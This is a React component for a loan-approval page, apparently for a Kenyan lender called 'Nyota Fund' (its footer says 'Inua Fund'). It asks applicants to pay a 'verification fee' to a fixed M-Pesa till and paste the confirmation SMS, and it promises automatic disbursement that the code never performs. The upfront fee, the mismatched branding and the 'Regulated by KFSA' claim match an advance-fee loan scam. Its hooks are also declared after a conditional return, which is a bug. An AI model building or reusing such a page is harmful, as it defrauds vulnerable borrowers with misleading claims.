import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import Swal from 'sweetalert2';
import './LoanApproval.css';
import { useLocation } from "react-router-dom";


const LoanApproval = () => {
  const navigate = useNavigate();

  const location = useLocation();
   const loanId = location.state?.loanId;
const loan = location.state?.formData;



 if (!loanId) {
    return (
      <div className="approval-container">
        <div className="approval-card">
          <h3>⚠️ Loan not found</h3>
          <p>Please apply for a loan first.</p>
          <button onClick={() => navigate("/")}>Go Home</button>
        </div>
      </div>
    );
  }


  

  const tillNumber = '9179737'; 

  const loanOffers = [
    { id: 1, amount: 2500, verificationFee: 150, duration: '2 months', interest: '10%' },
    { id: 2, amount: 5000, verificationFee: 250, duration: '2 months', interest: '10%' },
    { id: 3, amount: 10000, verificationFee: 350, duration: '2 months', interest: '10%' },
    { id: 4, amount: 20000, verificationFee: 500, duration: '2 months', interest: '10%' },
    { id: 5, amount: 30000, verificationFee: 750, duration: '2 months', interest: '10%' },
    { id: 6, amount: 40000, verificationFee: 850, duration: '3 months', interest: '12%' },
    { id: 7, amount: 50000, verificationFee: 1000, duration: '4 months', interest: '15%' },
  ];

  const [selectedLoan, setSelectedLoan] = useState(null);
  const [mpesaMessage, setMpesaMessage] = useState('');
  const [parsedAmount, setParsedAmount] = useState('');
  const [parsedPhone, setParsedPhone] = useState('');
  const [submitted, setSubmitted] = useState(false); // ✅ ADDED
  

  // 📋 Copy PayBill
  const copyTillNumber = () => {
    navigator.clipboard.writeText(tillNumber)
      .then(() => Swal.fire('Copied!', `Till number ${tillNumber} copied.`, 'success'))
      .catch(() => Swal.fire('Oops!', 'Could not copy till number.', 'error'));
  };

  useEffect(() => {
  if (!mpesaMessage) {
    setParsedAmount('');
    setParsedPhone('');
    return;
  }

  const amountMatch = mpesaMessage.match(/Ksh\s?([\d,.]+)/i);
  const phoneMatch = mpesaMessage.match(/(\+254|254|0)?7\d{8}/);

  setParsedAmount(amountMatch ? amountMatch[1].replace(/,/g, '') : '');
  setParsedPhone(phoneMatch ? phoneMatch[0] : '');
}, [mpesaMessage]);


  // ⬇ AUTO-SCROLL AFTER LOAN SELECTION
  useEffect(() => {
    if (selectedLoan) {
      document
        .querySelector('.payment-instructions')
        ?.scrollIntoView({ behavior: 'smooth' });
    }
  }, [selectedLoan]);

 const handleSubmitMessage = async () => {
  const res = await fetch("http://localhost:8080/api/payments", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      loanId,
      mpesaMessage,
      phone: parsedPhone,
      amount: parsedAmount
    })
  });

  if (!res.ok) throw new Error("Payment failed");

  setSubmitted(true);
};



  return (
    <div className="approval-container">
      <div className="approval-card">

        {/* 🔢 PROGRESS INDICATOR */}
        <div className="progress-steps">
          <span className="active">1. Select Loan</span>
          <span className="active">2. Pay Verification</span>
          <span>3. Approval</span>
        </div>

       <div className="approval-header">
  <h2>Nyota Fund</h2>
  <p>
    Applicant: <strong>{loan.fullName}</strong> <br />
    Select a loan option and pay via M-Pesa Till
  </p>
</div>


        {/* 💳 LOAN OPTIONS */}
        <div className="loan-options">
          {loanOffers.map((offer) => (
            <div
              key={offer.id}
              className={`loan-option-card ${selectedLoan?.id === offer.id ? 'selected' : ''}`}
              onClick={() => setSelectedLoan(offer)}
            >
              <div>
                <strong>Ksh. {offer.amount.toLocaleString()}</strong>
                <p>Duration: {offer.duration}</p>
                <p>Interest: {offer.interest}</p>
              </div>
              <div>
                Verification Fee: <strong>Ksh. {offer.verificationFee}</strong>
              </div>
            </div>
          ))}
        </div>

      {selectedLoan && (
  <div className="payment-instructions">

    {submitted ? (
      <div className="success-card">
        <h3>✅ Verification Submitted</h3>
        <p>
          We’ve received your M-Pesa message.
          Our team is reviewing it and you’ll be notified shortly.
        </p>
        <small>Tracking ID: {loanId}</small>

        <button className="get-loan-btn" onClick={() => navigate('/')}>
          Go Home
        </button>
      </div>
    ) : (
      <>
        {/* Pay via Till Button */}
        <button className="pay-via-till-btn">
          <img
            src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAoCAMAAAC7IEhfAAAAflBMVEUvxW3///8kxGiC1aAkw2gmxGmH2KR1y5UPwWG86MscwmVq0ZFu0I/s+PAAv1jd8+Sv5MF41ZpIynxdyoev3b9UzICh37KR26mZ3a3V8N3C6s/m9utYzYVp0IsOxmc5uWKm4rtnn1vkKTXIRTEAu0rO8NmCtn6NjFN7m1k+yHUOOvVTAAAA9klEQVQ4je3UDUvDMBAG4FzX6F3SNGm3fqbpoq5T//8fNIOOzVlCFQURXyg05SnHJeEYrAz7IUh3kdAFSkwjQXmGhCwapBlu0jhMN2eYxGHyDz8LOV8Hqyyr4pAjokBRN017emNifsKCX0MuO92THdy4H/ykfO4VIak+6bSW/BoWUIDRU/bw+NRbBy004MHL8C8UN/AAkqbj84vrdQU11KZsCciWN1Da3Dpv3DgOvVIUSutXqwzTyr4rHZphyAUWZZlNU35qJHxYaGbeB2G6zn+8xQv7KIRYOKVfdin+AFw7UlYPKdgijwS3l0G6u49k95XR/J3wDc+lEcFKLmkAAAAAAElFTkSuQmCC" 
            alt="M-Pesa Logo"
            className="mpesa-logo"
          />
          Pay via Till
        </button>

        {/* Manual Payment Instructions */}
        <div className="manual-payment-card">
          <h4>Manual Payment Instructions</h4>
          <p>
            Go to <strong>Lipa na M-Pesa</strong><br />
            Choose <strong>Buy Goods and Services</strong><br />
            Enter Till Number: <strong>{tillNumber}</strong><br />
            <button className="copy-btn" onClick={copyTillNumber}>Copy</button>
            Amount: <strong>Ksh {selectedLoan.verificationFee}</strong>
          </p>
          <p>
            After paying processing fee paste the message below, funds are automatically disbursed to your M-Pesa.
            Click <strong>"I Have Paid"</strong> below.
          </p>

          <textarea
            placeholder="Paste the FULL M-Pesa confirmation SMS here"
            value={mpesaMessage}
            onChange={(e) => setMpesaMessage(e.target.value)}
          />

          {mpesaMessage && !parsedAmount && (
            <p className="parse-error">
              ❌ Unable to read M-Pesa message. Please paste the full SMS.
            </p>
          )}

          {parsedAmount && parsedPhone && (
            <p className="parse-success">
              ✔ Payment detected — Ksh {parsedAmount} from {parsedPhone}
            </p>
          )}

          <button
            className="get-loan-btn"
            
            onClick={handleSubmitMessage}
          >
            I Have Paid
          </button>
        </div>
      </>
    )}
  </div>
)}


        <div className="footer-note">
          © Inua Fund 2026 | Regulated by KFSA
        </div>

      </div>
    </div>
  );
};

export default LoanApproval;
